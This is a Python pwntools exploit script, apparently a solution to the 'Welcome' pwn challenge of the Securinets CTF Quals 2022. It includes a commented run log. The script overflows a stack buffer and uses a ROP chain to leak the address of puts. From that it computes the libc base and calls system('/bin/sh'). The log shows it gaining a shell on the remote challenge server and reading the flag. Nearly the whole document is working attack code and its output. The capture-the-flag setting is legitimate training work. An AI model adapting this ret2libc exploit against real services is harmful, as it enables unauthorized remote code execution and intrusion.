from pwn import *

context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './welc'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "20.216.39.14"
  PORT = 1237
  s = remote(HOST, PORT)
  libc = ELF("./libc.so.6")
else:
  s = process(BINARY)
  #s = process(BINARY, env={'LD_PRELOAD': './libc-2.23.so'})
  libc = elf.libc

pop_rdi_ret = 0x401283 # pop rdi; ret; 
puts_plt    = 0x401060

s.recvuntil("what about you ?\n")

buf  = "A"*136
buf += p64(pop_rdi_ret)
buf += p64(elf.got.puts)
buf += p64(puts_plt)
buf += p64(elf.sym.main)
s.sendline(buf)

puts_addr   = u64(s.recvuntil("\n")[:-1] + "\x00\x00")
libc_base   = puts_addr - libc.sym.puts
system_addr = libc_base + libc.sym.system
binsh_addr  = libc_base + next(libc.search('/bin/sh'))

print "puts_addr   =", hex(puts_addr)
print "libc_base   =", hex(libc_base)
print "system_addr =", hex(system_addr)
print "binsh_addr  =", hex(binsh_addr)

s.recvuntil("what about you ?\n")

buf  = "A"*136
buf += p64(pop_rdi_ret+1)
buf += p64(pop_rdi_ret)
buf += p64(binsh_addr)
buf += p64(system_addr)
s.sendline(buf)

s.interactive()

'''
mito@ubuntu:~/CTF/Securinets_CTF_Quals_2022/Pwn_Welcome$ python solve.py  r
[*] '/home/mito/CTF/Securinets_CTF_Quals_2022/Pwn_Welcome/welc'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to 20.216.39.14 on port 1237: Done
[*] '/home/mito/CTF/Securinets_CTF_Quals_2022/Pwn_Welcome/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
puts_addr   = 0x7ffbf50c9450
libc_base   = 0x7ffbf5045000
system_addr = 0x7ffbf50972c0
binsh_addr  = 0x7ffbf51f95bd
[*] Switching to interactive mode
$ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
$ ls -l
total 44
-rw-rw-r-- 1 root root    61 Apr  9 16:28 flag.txt
-rwxrwxr-x 1 root root 16896 Apr  9 16:26 welc
-rwxrwxr-x 1 root root 18744 Apr  9 03:24 ynetd
$ cat flag.txt
Securinets{5d91d2e01b854fd457c1d8b592a19b38af6b4a33c6362b7d}
'''
